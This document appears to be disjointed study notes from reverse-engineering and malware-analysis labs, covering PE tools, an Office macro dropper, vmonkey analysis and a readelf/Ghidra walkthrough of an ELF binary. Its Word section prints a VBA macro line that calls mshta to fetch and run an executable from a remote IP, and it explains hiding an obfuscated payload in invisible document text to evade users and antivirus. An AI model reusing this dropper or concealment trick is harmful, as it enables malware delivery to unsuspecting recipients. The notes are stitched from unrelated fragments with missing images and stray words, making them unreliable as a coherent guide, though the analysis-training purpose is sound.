Data carving, also known as file carving, is the forensic technique of reassembling files from raw data fragments when no filesystem metadata is available.

STRINGS--
You'll find that programs often contain large amount of strings and using the "strings" tool from sysinternals may only display 10% of these...

...That and it's not exactly practical scrolling up through a terminal for stuff like this - we are on Windows afterall! There's a GUI tool for that.

Launch the application within "Tools/Static/PE Tools/PE Explorer

Where you will be presented with the following, indicating that it has successfully imported:

After import. Navigate to "View -> Imports"

ida 
IDA Freeware is arguable as the tool can be used for both static and dynamic analysis. 

MSI is an installer package file format used by Windows. 

Basic RE room
#~  7z x <filename>


WORD----
The Change in Focus from APT's

Malware infection via malicious macros (or scripts within Microsoft Office products such as Word and Excel) are some of the most successful attacks to date.

For example, current APT campaigns such as Emotet, QuickBot infect users by sending seemingly legitimate documents attached to emails i.e. an invoice for business. However, once opened, execute malicious code without the user knowing. This malicious code is often used in what's known as a "dropper attack", where additional malicious programs are downloaded onto the host.

Take the document file below as an example:

Looks perfectly okay, right? Well in actual fact, this word document has just downloaded a ransomware file from a malicious IP address in the background, with not much more than this snippet of code:

  Private Sub Howdy()
      Shell ("cmd /c mshta http://x.x.x.x/MyDropper.exe")
  End Sub
 have programmed the script to show a pop-up for demonstration purposes. However, in real life, this would be done without any popup.
 Luckily for me, this EXE is safe. Unfortunately in the real-world, this EXE could start encrypting my files. 

Thankfully Anti-Viruses these days are pretty reliable on picking up that sort of activity when it is left in plaintext. The following example uses two-stages to execute an obfuscated payload code.

The macro starts once edit permissions ("Enable Edit" or "Enable Content")have enabled edit mode on the Word document
The macro executes the payload stored in the text within the document.
The downside to this? You need a large amount of text to be contained within the page, users will be suspicious and not proceed with editing the document.

Although, just put on your steganography hat...Authors can just remove the borders from the text box and make the text white. The macro doesn't need the text to be visible to the user, it just needs to exist on the page.

First, we will analyse a suspicious Microsoft Office Word document together. We can simply use REMnux's "vmonkey" which is a parser engine that is capable of analysing visual basic macros without executing (opening the document).
By using "vmonkey DefinitelyALegitInvoice.doc" vmonkey has detected potentially malicious visual basic code within a macro.



Assemble and link the assembly program using 
  "nasm -felf32 assembly.asm && ld -m elf_i386 assembly.o"
  
 eadelf
Now that the file has been identified, you could open it up in Ghidra straight away, or use the readelf command to give you a bit more information. Let's use readelf first then go into Ghidra. 

Readelf provides information on ELF executables. Using readelf -a <executable> will display:

File headers
Program headers
Section headers
Symbols
Relocations (if present)
Dynamic sections (if present)
Version sections (if present)
Architecture-specific information
All of the information above is important, yet you'll notice that some of the data returned may or may not be present in the binary. There are certain pieces of data that will always be present in an executable, as referred to the Application Binary Interface (ABI) in Linux. This is a set of ‘rules’ that executables need to follow for them to be ELF executables.

One of the important parts of the readelf analysis is Section headers. In the image below you can see a number of different sections shown from the readelf output. If you refer to the code above the assembly program, it only declares two sections: .text and .data. The assembler actually creates a few more sections automatically with the headers which hold the information about each of the following sections:

.text – Stores the executable code (defined by the program above)
.data – Stores the initialised variables (defined by the program above)
.symtab – An object file's symbol table which holds information needed to locate and relocate a program's symbolic definitions and symbolic references
.strtab – String table sections hold null-terminated character sequences, commonly called strings
.shstrtab – Holds section names

Section information
The image above depicts lots of information attached to the section headers, which are effectively the properties of each section. They are defined below:

Type – Specifies the type of section
NULL – An inactive header
PROGBITS – Sections defined by the program itself (programmable bits)
SYMTAB – Identifies sections that are symbol tables. With enough of these, the binary will be statically linked, not dynamically.
Addr – The starting address of the section as if it was in running memory (RAM). Notice the .text Addr is the same as the Entry Point Address of the executable.
00000000 – The section will never get loaded into RAM.
Off – The offset within the executable from the starting point of the file 0. Notice the final two hexadecimal characters for the .data and .text section are the same as the last two for the Addr – a4 and 80 respectively.
Size – The size of the sections referenced
ES – Some sections hold a table of fixed-size entries, such as a symbol table. For such a section, this member gives the size in bytes of each entry.
Flg – Flags which show the attributes of the section, whether it is executable, allocable, writeable, etc.
Lk – Whether the section links to another section; this executable has the value 4 meaning it links to the section .strtab
Inf – One greater than the symbol table index of the last local symbol, binding to STB_LOCAL (to keep the symbols inside the .symtab section only visible inside this file)
Al – Section alignment: if there are certain size values inside various sections, the alignment may be required to be a certain value
0 or 1 means there are no alignment requirements
As a reverse engineer, it's important to get used to researching on your own. Go to the file /usr/include/elf.h to see the structure that defines a 32- bit ELF section header. This is also shown below:

Most notably is the addition of a function inside Ghidra. The label exit has actually created a function which is referable in the Symbol Tree Menu. 

In the second line mov ecx, string, Ghidra has been our friend here. The hexadecimal ends in a4900408, which is little endian for 08090a4, a memory address which the string label references to. Ghidra knows this and has used the symbols defined within the executable to cross reference this for the reverse engineer. Hover over the string inside Ghidra to view the referenced place.

Another difference in the source code is that we use the label len to dictate the address that stores the value of the length of string. This is calculated using $ - string (where $ represents the current memory address), which is present in the source code further up. The current memory address is subtracted from the address of string to find out the difference in memory addresses. This gives us the length of the string in bytes. However, you can see that edx in the sys_write system call takes an integer not a memory location. The directive equ tells the assembler to calculate this and replace where the label is referenced with the actual integer value.

By selecting the .data section in the Program Trees Menu on the left hand side within Ghidra, you can see that the len label is not there, but the string is. This shows you that it is just replacing aspects of the code instead of storing it as a variable and referencing it from this section.

Take a look at the decompiled code and try to make sense of it. Future episodes in this series will cover the decompiled widget further, but what do you think creates the do while loop?

 








